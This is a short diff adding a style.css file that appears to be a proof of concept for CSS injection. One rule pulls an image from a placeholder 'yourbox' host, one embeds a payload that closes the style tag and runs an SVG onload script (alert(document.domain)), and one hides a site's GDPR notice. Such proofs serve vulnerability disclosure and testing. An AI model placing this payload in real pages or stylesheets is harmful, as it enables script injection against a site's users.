@@ -1,0 +1,15 @@
+style.css:
+
+div  {
+    background-image: url("https://yourbox/poc.svg");
+    background-color: #cccccc;
+}
+body {
+	background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
+	background-color: #FF0000;
+	
+}
+._2brsq-_-_-client-components-gdpr-notification--notification-wrapper {
+	background-color: red;
+	visibility: hidden;
+}
